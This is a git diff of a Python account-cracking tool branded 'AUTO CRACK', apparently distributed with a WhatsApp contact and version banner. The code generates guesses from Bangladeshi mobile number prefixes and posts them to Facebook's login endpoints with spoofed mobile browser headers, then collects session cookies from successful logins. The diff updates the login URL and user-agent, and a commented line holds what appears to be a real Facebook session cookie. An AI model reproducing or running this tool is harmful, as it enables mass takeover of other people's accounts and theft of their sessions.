@@ -103,7 +103,7 @@ d8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 [√] WATHAPP : 0130xxxxx54
 [√] TOOLS   : AUTO CRACK
 [√] Stetus  : FREE
-[★]VIRSION  : 0.1.8
+[★] VIRSION : 0.1.9
 ====================================================""") 
 loop = 0
 oks = []
@@ -169,7 +169,7 @@ def xxr():
     print(logo)
     print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m017,\033[38;5;195m018{x}')
     print(f' ===================================================')
-    rk1 = '01727'
+    rk1 = '0172'
     rk2 = '0191'
     rk3 = '0185'
     rk4 = '0160'
@@ -232,17 +232,17 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
+            # 'cookie': 'datr=wZ_pY9aMkf8AFEgFXkpkr-oo; sb=wZ_pY2-V7WuYpyeZg3yMObfx; locale=en_US; m_pixel_ratio=1.75; zsh=ASTH7pQYoHT08yS4lY8uEkh9c7JewfkA7_rFjFnPhRFIG77Mg7D4BYeEVQIy-FcQU2Fh0pNy3C9pH992nL925PUYoQ-JLYMwanULGMbLooYC29cIu7R4bpgfiKxsZrd-FsH9MesXKVfHpyZQvKHdoprzOg40JOSrs5kEemmKlUT_HGuStIe2Gcxg4-dmD98RpD7xdE3OWlWGCCYRDeqBVG1Xe1caMBTuwRylrheB1s1tFc5VnvyI2S_a5IGP4zP7RB0HA82hWnBIgse6mVzBRtUGJspsFZdGgP8Jfly1XThmzo30erITplrxNTCd_mLNUvILpgDUq5Ie3nes6yJ4UKA; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaRGxQaVRJQ19fTHhWSXNMLTY0cjFpN3p2V3dSX2JLM1VlQWJPbjZvRmdwZUZuREp4cURmbVNfRWZuMUJzRlN5ayIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpEbFBpVElDX19MeFZJc0wtNjRyMWk3enZXd1JfYkszVWVBYk9uNm9GZ3BlRm5ESnhxRGZtU19FZm4xQnNGU3lrIiwicyI6Im0ifQ%3D%3D; wd=412x828; fr=0Io6O5s8KoLgbsXZd.AWVWCswn_OAYO30YzTlbPci90x4.Bj9FoG.jZ.AAA.0.0.Bj-JWe.AWWACzCqSfI',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
